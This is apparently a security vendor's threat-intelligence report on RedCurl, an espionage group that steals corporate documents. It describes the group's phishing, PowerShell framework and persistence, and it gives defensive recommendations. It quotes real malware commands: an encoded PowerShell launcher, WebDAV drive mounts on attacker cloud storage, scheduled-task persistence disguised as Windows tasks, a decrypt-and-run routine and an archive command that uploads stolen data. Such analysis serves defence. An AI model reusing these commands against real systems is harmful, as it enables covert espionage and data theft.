They asked for help in eliminating the incident’s aftermath and identifying the hacker group responsible.\n\n The duty CERT-GIB analyst examined the phishing email used at the initial infection stage. It was particularly well-written, which suggested that this was a planned targeted attack. The unique behavioral fingerprint — obtained as a result of dynamic analysis in TDS Polygon, a Group-IB Threat Detection System module, confirmed the analyst’s hypothesis. The analyst immediately noti- fied Group-IB’s Threat Intelligence team about the incident and within a couple of hours the customer was informed about the targeted attack against their business.\n\n Meanwhile, the email sample and the attack details caught the attention of Group-IB’s Threat Intelligence specialists. The cam- paign conducted by the hacker group (unknown at the time) involved unique tools written in PowerShell, which is popular among IT specialists. Moreover, the emails targeted a specific team within the victim organization rather than the organization as a whole. It became obvious that it was not an ordinary cybercriminal group seeking to steal money. Group-IB specialists’ findings confirmed earlier forecasts made in the analytical report “Hi-Tech Crime Trends 2019/2020”: namely that espionage- and sabotage-ori- ented APT groups had come to play an increasingly prominent role on the hacker scene. One such group was the one in question: RedCurl.\n\n In each analyzed campaign, the group’s goal was to conduct espi- onage. The attackers infected computers in targeted departments within organizations and stole specific documents. One of the group’s possible victims was an employee at a cybersecurity com- pany that protects its customers against such attacks. Detected incidents related to this threat group took place in various indus- tries and had a wide geographical scope: from Russia to North America. As such, it is likely that the attacks were ordered for the purpose of corporate espionage. This hypothesis is reinforced by the fact that the group acted as covertly as possible in order to minimize the risk of being discovered on the victim’s network. For instance, RedCurl did not use actively communicating Trojans or remote administration tools with a graphical interface.\n\n It should also be noted that RedCurl uses techniques similar to those used by Red Teaming and penetration testing specialists.\n\n\n-----\n\n###### This report contains the first ever descriptions of the tactics, tools, and infrastructure of RedCurl, a previously unknown group. In addi- tion, this paper includes the first ever details about the group’s kill chain, which were prepared by specialists at Group-IB’s Digital Forensics Lab, as well as unique data collected during incident response operations related to campaigns attributed to RedCurl.\n\n As part of their research, Group-IB’s digital forensics experts veri- fied the hypothesis that the techniques used by RedCurl are simi- lar to those involved in the RedOctober and CloudAtlas campaigns, whose goal is also espionage. An in-depth analysis based on the MITRE ATT&CK® matrix did not reveal unambiguous links between these campaigns, however.\n\n Indicators of compromise are given at the end of the report as usual, excluding the ones that can lead to the identifica- tion of RedCurl’s victims. YARA and Suricata rules, however, are only available to Group‑IB Threat Intelligence customers. Traditionally, the report features recommendations from Group-IB experts on preventive measures to help protect against the group’s attacks.\n\n\n-----\n\n### Key findings\n\n###### Name RedCurl (given by Group-IB)\n\n Goal Corporate espionage and theft of documents\n\n Active 2018 to present. Over more than two years, Group-IB has detected 26 targeted attacks\n\n Geography Russia, Ukraine, Canada, Germany, the United Kingdom, Norway\n\n Victims Construction companies, financial and consulting companies, retailers, banks, insurance companies, law firms, travel agencies\n\n Language The group is presumably Russian-speaking\n\n Tools RedCurl created a set of PowerShell programs that can cumula- tively be called a framework and that includes:\n • Droppers (including an initial dropper, InitialDropper)\n • Key module FirstStageAgent (aka FSA)\n • \u0007Two submodules called Channel1 (aka FSA.C1)  and Channel2 (aka FSA.C2)\n\nFigure 1. Trojan unpacking diagram\n\n###### The Trojan receives commands from its operator through a cloud in the form of BAT scripts, which are simply subprograms. A total of 29 such command programs were identified.\n\n\n-----\n\ninfo\ncommands\ncheck\nexfiltration\n\nFigure. 2. Diagram of Trojan-operator interactions through the cloud\n\n###### The group’s technical • Minimal use of binary code. characteristics • Use of anti-detection techniques.\n • \u0007Control over an infected computer through commands kept in a legitimate cloud storage. The commands are sent as Power- Shell scripts.\n • \u0007Special scripts for displaying fake Outlook windows to intercept the logins and passwords of targeted individuals.\n • \u0007The group usually remains in the victim’s network for two to six months. The stage of spreading over the network is stretched over a long time to remain unnoticed for as long as possible. To achieve this, the group does not use any actively communi- cating Trojans or remote-control tools via RDP.\n\n Target system The main targets include office documents and emails.\n\n\n###### Exfiltration of data  to legitimate cloud  storage\n\n\n###### RedCurl uses cloud services such as cloudme.com, koofr.net, pcloud.com, idata.uz, drivehq.com, driveonweb.de, opendrive.com, powerfolder.com, docs.live.net, syncwerk.cloud, cloud.woelkli.com, and framagenda.org. To manage and access clouds, the threat actors use the service multcloud.com.\n\n\n-----\n\nFigure 3. Timeline\nof RedCurl attacks\n\n\n### Geographical scope and targets\n\n###### All RedCurl attacks are targeted, i.e. emails and droppers are tai- lored to specific victims, which makes it possible to identify targets. Not all the victims have been identified, however. In some cases, only malware modules were discovered (rather than the initial dropper, which can reveal the target).\n\n Since 2018, Group-IB has detected 26 attacks against targets in various industries, including:\n\n • Construction companies\n • Retailers\n • Travel agencies\n • Insurance companies\n • Financial companies\n • Banks\n • Law and consulting firms\n\n The geographical scope of RedCurl attacks includes Europe, the post-Soviet region, and North America. The victims of the 26 attacks detected are located in:\n\n • Russia\n • Ukraine\n • Canada\n • Germany\n • The United Kingdom\n • Norway\n\n Group-IB identified 14 organizations that have become victims of RedCurl’s espionage attacks, some on several occasions. Group-IB specialists contacted each of them and provided recom- mendations on further steps to eliminate the consequences of the attacks. Names of victims are not disclosed. At the time of writing, some of the companies continue to respond to the incidents.\n\n Analysis of the customer’s compromised data revealed a set of data relating to a team lead at a cybersecurity company. The IP addresses that communicated with RedCurl’s cloud belong to the company in question. It is impossible to determine whether this data was compromised or whether this was an instance of controlled analysis of the Trojan by researchers.\n\n\n-----\n\n###### Spear-phishing emails\n\nWere used by the group to get initial\naccess to targeted companies\n\n\n### Initial access\n\n###### As is the case with many espionage campaigns, initial access to targeted infrastructures in RedCurl attacks involves spear-phishing emails. RedCurl’s distinctive feature, however, is that the email content is carefully drafted. For instance, the emails displayed the targeted company’s address and logo, while the sender address featured the company’s domain name.\n\n The attackers posed as members of the HR team at the targeted organization and sent out emails to multiple employees at once, which made the employees less vigilant, especially considering that many of them worked in the same department.\n\n To deliver the payload, RedCurl used archives, links to which were placed in the email body. Despite the fact that the links redirected to public cloud storage services, the way they were disguised tricked users into thinking that they were visiting the company’s official website:\n\nFigure 4. Example of a spear-phishing email sent by RedCurl\n\n\n-----\n\nFigure 5. Example of a spear-phishing email sent by RedCurl\n\n###### The phishing emails were sent using the domain name  mailsecure[.]tech, and more specifically subdomains that imitated the target organization’s legitimate domain. The specified domain name had been registered six months before the campaign was launched, on December 6, 2018. On the day of the attack, the SOA record was changed and Yandex was specified for the MX record:\n\nFigure 6. Technical records of the domain mailsecure[.]tech\n\n\n-----\n\n###### LNK, XLAM — 2020 EXE — 2019\n\nfiles launched RedCurl.Dropper\non the victim’s computer\n\nFigure 7. Example\nof a downloaded\nfile with the\nextension made\ninvisible\n\n\n###### Naturally, the websites belonging to the targeted organizations did not host the archive, which was stored in the cloud, most often Dropbox. In addition to Dropbox, RedCurl’s campaigns also involved free hosting services, especially Byethost and AttractSoft:\n```\n http://********.byethost22.com/3/%D0%9F%D0%BE%D0%BB%D0%BE%D0\n %B6%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%BE%20%D0%B5%D0%B6%D0%B5%D0%\n B3%D0%BE%D0%B4%D0%BD%D0%BE%D0%BC%20%D0%BF%D1%80%D0%B5%D0%BC%\n D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B8%20%D1%81%D0\n %BE%D1%82%D1%80%D1%83%D0%B4%D0 %BD%D0%B8%D0%BA%D0%BE%D0%B2.7z\n http://********.byethost7.com/dl/********.7z\n http://logs99.atwebpages.com/********/reports/\n 002838177363613567218367647/actual/report.php\n http://mtpon34.myartsonline.com/report/2890000027835616636545613/\n actual/report.php\n\n Attacks carried out in 2020 involved LNK and XLAM files. The latter are add-in files for Excel 2010 and Excel 2007 based on XML with support for macros. As victims interacted with these files, an attacker-controlled cloud storage was set up on the local system as a network drive and launched RedCurl.Dropper, which was hosted there, after which a phishing document was displayed to the victim.\n\n In the attacks observed in 2019, victims downloaded an archive with an EXE file, which was an SFX (self-extracting) archive. Launching this file extracted and launched RedCurl.Dropper. The launched file had a PDF or Microsoft Word icon, which meant that if showing file extensions was disabled on the victim’s com- puter, there was a good chance that the file would not raise any suspicions.\n\n In RedCurl’s earlier campaigns carried out in 2018, the utility NirCmd was extracted from the SFX archive. NirCmd was used to launch the module FirstStageAgent_light. In addition to the SFX archive, RedCurl used MHT files, which were HTML pages with resources necessary for displaying the contents correctly. When such a file was opened in the browser, the user was asked to allow interaction between ActiveX and parts of the web page:\n\n```\nFigure 8. MHT InitialDropper\n\n\n-----\n\n##### 2019--2020\n\n 2018\n\n\n###### In the case of an MHT file, RedCurl.FirstStageAgent was launched using Windows PowerShell. In addition, the contents of the phish- ing document or web page were displayed.\n\nFigure 9. Types of Trojans in 2018, 2019, and 2020\n\n###### RedCurl.FirstStageAgent was distributed in a similar way, using JavaScript. When it was launched, the victim was shown a legit- imate web page that asked them to download, install, or re-in- stall Microsoft 365 or Office 2019. A detailed description of RedCurl’s toolset can be found in the “Tools” section.\n\n\n-----\n\n### Trojan execution and persistence in the system\n\n###### The vast majority of tools used in RedCurl campaigns are Windows PowerShell scripts. For instance, a PowerShell script was used to launch RedCurl.Dropper and set up cloud storage as a network drive. Below is one such example:\n```\n powershell.exe -enc\n “JgAgACIAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIgAgAEAAKAAiAHMAZABtAD\n UALgBkAGwAbAAsAG8AQgBTAGkAUQBTAFUASQBTAHIAUwB5AE4AYQBJAGEAagBQA\n HAAaQBWAFUAUQBCAE0AZwBBACIAKQA7ACAAbgBlAHQAIAB1AHMAZQAgAGgAdAB0\n AHAAcwA6AC8ALwBhAHAAcAAuAGsAbwBvAGYAcgAuAG4AZQB0AC8AZABhAHYAIAB\n uADYAegByAHMAcwA5AGQAbwBxAG8AagA2AGkAdQAxACAALwB1AHMAZQByADoAZg\n BvAHkAdQBiAEAAdABoAGUAdABlAG0AcABtAGEAaQBsAC4AYwBvAG0AOwAgAG4AZ\n QB0ACAAdQBzAGUAIABcAFwAYQBwAHAALgBrAG8AbwBmAHIALgBuAGUAdABAAFMA\n UwBMAFwAZABhAHYAIAAvAEQARQBMAEUAVABFADsA”\n “rundll32.exe” @(“sdm5.dll,oBSiQSUISrSyNaIajPpiVUQBMgA”);\n net use https://app.koofr.net/dav PASSWORD\n /user:foyub@thetempmail.com;\n net use \\\\app.koofr.net@SSL\\dav /DELETE;\n\n The above script is saved in a batch file and launched after the phishing SFX archive is opened using a VBScript script. Module persistence is sometimes established during the SFX archive opening stage. In such cases, a shortcut with a module launch command is created in the Startup directory.\n\n RedCurl.Dropper, which is a library, is launched using  rundll32.exe. RedCurl.FSA and the additional modules  RedCurl.FSA.C1 and RedCurl.FSA.C2, on the other hand,  are extracted from a CAB archive.\n\n In earlier attacks that took place in 2018, the additional modules Channel1 and Channel2 were downloaded from the cloud. In the most recent attacks, the modules were located in the same CAB archive as FirstStageAgent, while RedCurl.Dropper itself was launched from a network drive set up during the initial access stage.\n\n These tools helped the attackers download additional PowerShell scripts (as well as other tools necessary for achieving specific goals) from cloud storage spaces and execute them. A detailed description of the main and additional modules can be found in the “Tools” section.\n\n Persistence for both the main and additional modules was estab- lished by creating scheduled tasks:\n\n```\n\n-----\n\n###### In earlier attacks, persistence was ensured also through the Run keys in the Registry:\n```\n New-ItemProperty -Path Registry::HKCU\\Software\\Microsoft\\\n Windows\\CurrentVersion\\Run -Name MicrosoftCurrentUpdatesCheck\n -Value “””$Channel1Dir\\check.exe”” loop 65000 3600000 execmd\n “”cd “”$Channel1Dir”” && call check.bat””” -Force | Out-Null\n\n The names of both scheduled tasks and Registry keys were designed in such a way so as to make it extremely difficult to distinguish them from legitimate operating system com- ponents and applications: MicrosoftCurrentUpdatesCheck, MDMMaintenenceTask, WindowsActionDialog, etc.\n\n```\n\n-----\n\n###### For 2 to 6 months\n\nRedCurl remains in the victim’s network\n\n\n### Reconnaissance and lateral movement\n\n###### Analysis of RedCurl campaigns revealed that the group remains in the victim’s network for two to six months on average. The stage of spreading over the network is significantly extended in time as the group strives to remain unnoticed for as long as possi- ble and does not use any active Trojans that could disclose its presence.\n\n By using Windows PowerShell scripts and legitimate cloud ser- vices, RedCurl reduced detections of the tools they used  to the minimum. As part of incident response operations, Group-IB specialists observed antivirus software being triggered by RedCurl.Dropper, but this occurred only after the malware had been in the system for several months.\n\n The attackers also used Windows PowerShell scripts to collect information about the compromised system as well as about local and network drives:\n\n The same scripts were also used to collect information about email accounts that could later be used for a new round of phish- ing campaigns.\n\n As part of its campaigns, RedCurl used ADExplorer from the Sysinternals Suite to collect information about Active Directory:\n\n\n-----\n\n###### LNK files\n\nUsed by RedCurl to substitute *.jpg,\n***.pdf, *.doc, *.docx, *.xls,** and *.xlsx files.\nBy opening such a file, the victim would\nlaunch RedCurl.Dropper\n\n\n###### Although this tool is intended for working with a graphical inter- face, the snapshot option makes it possible to launch it from the command line and save a copy of the Active Directory database to a file.\n\n Unlike many other espionage groups, RedCurl does not seek to gain access to systems using the Remote Desktop Protocol or similar. Instead, the group sticks to tools with a command line interface using SSH for interactive access, for example.\n\n In RedCurl campaigns, movement across the network was ensured using modified LNK files (shortcuts), which were placed in network drives.\n\n By using a Windows PowerShell script, the attackers created LNK shortcuts for *.jpg, *.pdf, *.doc, *.docx, *.xls, and *.xlsx files hosted on network drives and turned on the “hidden” attribute for the original files. By merely opening a target file, the unsuspecting victim would launch RedCurl.Dropper together with it.\n\n RedCurl.Dropper was also copied to the directory where the files were located on the network drive. Although this propagation method is “low and slow,” it helps threat actors successfully bypass certain security systems.\n\n\n-----\n\n###### LaZagne\n\nThe tool used by RedCurl to extract\npasswords not only from memory but\nalso from files, such as those saved\nin the victim’s browser\n\n###### PyArmor\n\nused by RedCurl to reduce the likelihood\nof RedCurl.Dropper being detected and\nobfuscate its code\n\n\n###### On account of this particular characteristic of LNK files, specialists at Group-IB’s Digital Forensics Lab were able to determine that these files had been opened by analyzing UserAssist, a source of artifacts traditionally used to search for traces of executable file launches and that normally does not contain such traces.\n\n In addition to Windows PowerShell scripts, RedCurl’s arsenal includes other tools. To harvest credentials, for instance, the attack- ers use an increasingly popular tool called LaZagne, which helps extract passwords not only from memory but also from files, such as those saved in the victim’s browser. This tool is written in Python and is delivered to compromised hosts together with the Python interpreter. To reduce the likelihood of LaZagne being detected, the attackers used PyArmor, which helped obfuscate its code.\n\n Moreover, a PowerShell script that displayed a phishing pop-up Microsoft Outlook window to the victim was used to collect authentication data.\n\n Credentials entered by the user were saved to a text file and then checked for validity. This way, if a targeted organization did not have multi-factor authentication in place, the attackers could gain access to compromised users’ email accounts even if the required data was not obtained through LaZagne.\n\n\n-----\n\n### Data exfiltration\n\n###### RedCurl focuses on compromising email. The attackers had a Windows PowerShell script in their arsenal to exfiltrate and copy emails.\n\n Apart from scripts, in some cases the hackers also used other tools to upload files to cloud services. In particular, they used the megatools set of utilities to upload data to Mega, a file storage service.\n\n The hackers searched both local drives and corporate network storages for documents of interest. Among the stolen files were:\n\n • Employee personnel files\n • Construction documentation\n • Legal action documents\n • Internal documents\n\n\n-----\n\n###### PowerShell\n\nThe entire set of RedCurl’s custom\ntools is written in PowerShell\n\n\n### Tools\n\n###### The entire set of the group’s custom tools is written in PowerShell. When these tools are in operation, third-party programs are additionally downloaded, including ones written in Python. RedCurl’s custom tools include:\n\n • RedCurl.InitialDropper\n • RedCurl.Dropper\n • RedCurl.FSA aka FirstStageAgent\n • RedCurl.FSA.C1 + RedCurl.FSA.C2\n • RedCurl.Commands\n\nFigure 10. Diagram showing FSA with its modules and commands\n\n\n-----\n\n##### InitialDropper The initial dropper RedCurl.InitialDropper is a regular SFXRAR\n###### or 7z archive with a PDF icon. This has not always been the case, however. Analysis of historical data revealed:\n\n • VBS_Dropper, a VBS script\n • XLAM_Dropper, an MS Office add-in file\n • LNK_Dropper, an MS Windows shortcut\n\n Launching it will unpack a decoy document, a malicious DLL library called RedCurl.Dropper, a VBS script, and a BAT command shell script.\n\nFigure 11. Contents of SFX InitialDropper\n\n###### The user will be shown the decoy document while the system utility wscript.exe executes the extracted VBS script, which launches the cmd.exe command line interpreter and the extracted BAT script.\n\nFigure 12. SFX InitialDropper diagram\n\n###### This will result in the launch of a PowerShell script that will set up a cloud storage as a network drive using the system utility net.exe:\n```\n                       net use \\\\app.koofr.net@SSL\\dav /DELETE;\n                       net use https://app.koofr.net/dav PASSWORD \n                       /user:foyub@thetempmail.com;\n\n Next, the script will use the system utility rundll32.exe to launch the dropper as the malicious library RedCurl.Dropper:\n\n```\n\n-----\n\n##### Dropper When Dropper is launched, tasks are created, which ensures the\n###### persistence of the key module RedCurl.FSA and the two “chan- nels,” RedCurl.FSA.C1 and RedCurl.FSA.C2.\n```\n                       C:\\Windows\\System32\\cmd.exe\n                       /c schtasks /Create /TN «WsSwapAssessmentTask» /SC hourly /\n                       MO 4 /ST 00:20 /tr «wscript.exe /B \\»C:\\Users\\John\\AppData\\Local\\\n                       Microsoft\\WsSwapAssessmentTaskF\\WsSwapAssessmentTaskS.vbs\\»» /F\n                       C:\\Windows\\System32\\cmd.exe /c schtasks /Create /\n                       TN «IndexerAutomaticMaintenance\\IndexerAutomaticMaintenanceTask» /\n                       SC hourly /ST 01:38 /tr «wscript.exe /B \\»C:\\Users\\John\\AppData\\\n                       Roaming\\IndexerAutomaticMaintenanceF\\IndexerAutomaticMaintenance.\n                       vbs\\»» /F\n                       C:\\Windows\\System32\\cmd.exe /c schtasks /Create /\n                       TN «LicenseAcquisitionService\\EnableLicenseAcquisitionTask» /\n                       SC hourly /ST 02:13 /tr «wscript.exe /B \\»C:\\Users\\John\\AppData\\\n                       Roaming\\Microsoft\\EnableLicenseAcquisitionS\n                       EnableLicenseAcquisitionF.vbs\\»» /F\n\n The program then extracts and saves a CAB archive to the disk, creates a new directory, and unpacks the contents of the CAB archive into that directory.\n\n```\nFigure 13. Contents of the CAB file\n\n###### The archive contains the 7-Zip utility, which has traditionally been used to create and unpack archives. All command mod- ules are encrypted using 7-Zip, which is also actively used by RedCurl’s Trojan. The archive also contains a utility called curl, which sends requests and ensures communication with the C&C server.\n\n\n-----\n\n##### FirstStageAgent aka FSA\n\n\n###### FirstStageAgent is designed to perform the following functions:\n\n 1. Extract the modules RedCurl.Channel1 and RedCurl.Channel2. 2. Upload information about the infected machine. 3. Download and execute a new command (module).\n\n The FSA key module connects to the cloud service to upload data and obtain commands. The commands are sent as BAT scripts, the body of which usually contains a PowerShell script or an encoded executable file and launch instructions.\n\n\n-----\n\n###### Download of a module with commands\n\n \u0007 \u0007Launch of a decrypted version of the BAT file using a VBS script (this step may be omitted)\n\n Launch of the BAT file\n\n Launch of the main part of the module\n\nFigure 14. FSA operation algorithm\n\n###### Along with the FSA key module, two auxiliary modules are installed: FSA.Channel1 aka C1 and FSA.Channel2 aka C2. They act in the same way as the key module, but they use different accounts to communicate with the cloud.\n\n RedCurl uses cloud services such as cloudme.com, koofr.net, pcloud.com, idata.uz, drivehq.com, driveonweb.de, opendrive.com, powerfolder.com, and docs.live.net.\n\n The modules RedCurl.Channel1 and RedCurl.Channel2 are stored in password-protected archives. The key for the archives is con- tained in an encrypted FirstStageAgent file. During the first start, FirstStageAgent extracts the contents of the archives using the “syspack.exe” utility. If the operation is successful, the  “syspack.exe”, “7za.dll”, and “curl.exe” files are copied to the  directory with the modules. Examples of commands for  extracting content from archives are presented below:\n```\n .\\syspack.exe x -aoa -p${fPass} $Channel1_path -o${Channel1Dir};\n .\\syspack.exe x -aoa -p${fPass} $Channel2_path -o${Channel2Dir};\n\n The program communicates with operators by reading and writ- ing to files located in the cloud storage. To interact with the cloud, FirstStageAgent uses the WebDav technology, which allows for operations with files over the HTTP protocol. Requests to the cloud are performed using the “curl.exe” utility. FirstStageAgent first checks for proxy settings. If found, the settings are used to make requests to the cloud.\n\n```\n\n-----\n\n###### All downloads from and uploads to the cloud are carried out  using the curl utility. Prior to sending, data is encrypted using  the 7-Zip utility.\n\ninfo\ncommands\ncheck\nexfiltration\n\nFigure 15. Diagram of Trojan-operator interactions through the cloud\n\n###### Before obtaining commands, FirstStageAgent logs the start time. To do so, the program adds the user- name as well as the current date and time to the end of the file “SYS\\${env:computername}.[jpg|txt]” located on the cloud service. The message is formed by the command “${env:username}_$(Get-Date -Format g)”. To perform the above actions, FirstStageAgent takes the following steps:\n\n 1. \u0007Downloads the file “SYS\\${env:computername}.[jpg|txt]”  to the folder with the module. 2. \u0007Adds the username as well as the current time and date  to the end of the file. 3. \u0007Deletes the file “SYS\\${env:computername}.[jpg|txt]”  from the cloud. 4. \u0007Downloads the modified file  “SYS\\${env:computername}.[jpg|txt]”. 5. Removes the downloaded file from the system.\n\n It is worth noting that modules are stored on the infected sys- tem in encrypted form. The modules are encrypted using the ConvertTo-SecureString function based on the AES algorithm. A random sequence of bytes is used as a key. The decryption key is always new for each attack and each module.\n\n\n-----\n\n###### The final stage of FirstStageAgent’s operation is to check for the file “enc/cmd.txt”, which contains a new module with commands. The file stored on the server is a System.Security.SecureString object. The ConvertTo-SecureString method is used to decrypt the module. The decryption key is located within the FirstStageAgent file. Analysis revealed that a new encryption key is generated for each attack. Apart from encryption, the data is Base64-encoded. Below is a code section responsible for decryption:\n```\n function Decrypt-CMD([BYTE[]] $key) {\n  $path = «.\\tempexec\\cmd.txt»;\n  $cmdname = -join ((48..57) + (97..122) | Get-Random -Count 8 | %\n {[char]$_});\n  $dec = Get-Content $path | ConvertTo-SecureString -Key $key;\n  $Ptr = [System.Runtime.InteropServices.\n Marshal]::SecureStringToCoTaskMemUnicode($dec);\n  $result = [System.Runtime.InteropServices.\n Marshal]::PtrToStringUni($Ptr);\n  [System.Runtime.InteropServices.\n Marshal]::ZeroFreeCoTaskMemUnicode($Ptr);\n  $bytes=[Convert]::FromBase64String($result);\n  $bytes | Set-Content «.\\tempexec\\${cmdname}.bat» -Encoding Byte\n -Force;\n  Start-Sleep 10;\n  Remove-Item .\\tempexec\\cmd.txt -Force; return $cmdname;\n }\n\n The file “enc/cmd.txt” is downloaded to the “.\\tempexec” directory, from which the FirstStageAgent module is launched. The module decryption function reads the contents of the downloaded file and decrypts it using the above algorithm (ConvertTo-SecureString -> Base64). The decrypted module is written to the same direc- tory. A random sequence of 8 characters is generated as a name (example: “[a-z0-9]{8}.bat”). At the last stage of its operation, FirstStageAgent deletes the downloaded file from the system and runs the decrypted file.\n\n After execution, all commands (modules) and created files are deleted using the sdelete utility.\n\n As such, all communications between the threat actor and the compromised infrastructure are carried out using legitimate  cloud services.\n\n```\n\n-----\n\n##### Channel1  aka RedCurl.C1 and Channel2  aka RedCurl.C2\n\n Commands\n\n\n###### The modules Channel1 and Channel2 have the same functions. Their main goal is to upload information about the infected device, then download and execute a new module with commands. The encryption method and the algorithm for receiving and sending data are the same as for FirstStageAgent. Each module uses differ- ent accounts to access the cloud storage.\n\n The main difference between the modules is the way they com- municate with the cloud storage. Channel1 and FirstStageAgent use the “curl.exe” utility to interact with the cloud, while Channel2 mounts a network drive into the system. Mounting is carried out using the “net.exe” utility. All subsequent operations with files located in the cloud are performed using console commands. An example of a command used to mount a network drive is pre- sented below:\n```\n net use https://storage.driveonweb.de/probdav $pass /user:$login /\n persistent:no;\n\n Another feature that distinguishes Channel2 from Channel1 is the way of launching the decrypted module with commands. Channel2 uses a VBS script that is run by a common program called “wscript. exe”. The path to the module is passed as an argument. Once the script is run, a “WScript.Shell” object is created, which is then used to launch a decrypted BAT file. An example of the VBS script is pre- sented below:\n On Error Resume Next\n CreateObject(«Wscript.Shell»).Run «»»» & WScript.Arguments(0) &\n «»»», 0, False\n\n Channel1 launches the decrypted module in the same way as FirstStageAgent.\n\n The FirstStageAgent, Channel1, and Channel2 modules only download and execute commands (modules) in the “cmd.exe” command-line interpreter. Each downloaded file is a separate module with com- mands that extend the Trojan’s functionality. This means that these Trojan commands are subprograms or modules.\n\n Certain modules can execute PowerShell commands. In such cases, they are Base64-encoded and stored in the file with the module. Modules can contain commands to download additional software. The downloaded modules communicate with operators using files located in the cloud. Additional programs required for the Trojan to operate are located in the cloud directory. It is worth noting that different accounts are used in the modules that store commands and the modules that run commands. However, different modules with commands use the same account. The same module can run on different machines. Modules check the computer name on which they are running to avoid restarting on the same machine. If the computer name matches one of the values ​​on the list, the module will continue with the execution.\n\n```\n\n-----\n\n###### Each module starts by creating a temporary directory to save the result of its operation. The directory that stores a module that launched the command is used as a working directory. The directory name is located in the file with the downloaded module. In the mod- ules analyzed, the directory names are based on the following pat- tern: “temp[0-9]{2,4}”.\n\n The output of each command is added to a password-protected archive. To create the archive, a console version of the 7-Zip program (syspack.exe) is used. The program is delivered to the infected device in advance. The password for the archive is contained in the file and is unique for each module. After files have been added to the archive, they are removed from the system. The archive name is generated using the following template:\n```\n                       %computername%_%username%_%%CMD_NAME%%_[%random%]_\n                       [%DD%%MM%|%MM%%DD%]_%HH%%MM%.tmp.\n\n The month and day will be determined correctly only if the “DD. MM.YYYY” or “MM.DD.YYYY” date format is set in the system. The %random% field may be missing in some cases. The %CMD_NAME% field depends on the module’s purpose. An example of a command used to create an archive is presented below:\n                       syspack.exe a -p%packpass% -mhe=on -sdel -y \\\\app.koofr.net@SSL\\\n                       dav\\Koofr\\STR\\%ARCH_NAME% %LOG_FOLDER%\n\n Modules were named based on the value of the %CMD_NAME% field.

These cyberespionage attacks targeted industrial, governmental, and commercial organizations in Russia, Central Asia, and Ukraine. They were carried out between 2010 and 2019. At the time of writing, there is no information about attacks involving CloudAtlas tools in 2020.\n\n RedCurl, discovered by Group-IB experts, carried out attacks at different intervals between 2018 and 2020 inclusive. The earli- est attack dates back to May 2018. Its victims included companies based in the UK, Canada, Norway, Germany, Russia, and Ukraine. All the companies were private and commercial.\n\n As such, based on the geographical scope of attacks, it is impossi- ble to confirm any links with the campaigns described by Kaspersky Lab.\n\n Analysis of RedCurl revealed that one of the SFX archives was cre- ated using the WinRAR utility set to Russian. This fact is confirmed by the strings in the section with resources. Moreover, Russian was set in one of the profiles used as a C&C server.\n\nFigure 17.

The C&C servers sent commands in separate modules. The RedOctober campaigns and early CloudAtlas attacks used the WebDAV protocol to communicate with operators, just like the RedCurl campaign. However, the tools used in RedCurl attacks are unprecedented and written in PowerShell. The lat- est CloudAtlas attacks also used a new PowerShell tool, which Group-IB classified as PowerShower. Analyzing this tool did not reveal overlaps in the code with any RedCurl tools. LaZagne was used to retrieve passwords as part of all the campaigns. A detailed comparison between the campaigns based on the  MITRE ATT&CK® matrix is presented below.\n\n|Col1|RedCurl|CloudAtlas|RedOctober|\n|---|---|---|---|\n|Initial access|SFX archives, LNK files,

In this case, Group-IB experts recommend taking the following steps:\n\n 1. Analyze phishing emails detected by security tools and users. 2. \u0007Monitor applications (including command line arguments) that are often used by cybercriminals during initial compromise (Microsoft Office, Acrobat Reader, archivers, etc.). 3. \u0007Restrict PowerShell execution on systems where it is unnec- essary. Monitor executable scripts and pay close attention to powershell.exe processes with long Base64-encoded strings in arguments. 4. Monitor arguments with which rundll32.exe is launched. 5. Monitor and verify tasks created in the scheduler. 6. Block access to cloud storage devices that are unnecessary. 7. \u0007Hunt for LNK files that point to documents or images but also have rundll32.exe or powershell.exe in the file path.\n\n\n-----\n\n###### 1,000+\n\nsuccessful investigations\nworldwide\n\n###### 60,000++\n\nhours of incident response\n\n###### $300 MLN\n\nreturned to Group-IB clients thanks\nto our products and services\n\n###### C\n\n\n### About Group−IB\n\n###### Group-IB is a leading provider of high-fidelity threat intelligence and best-in-class anti-APT and anti-fraud solutions.
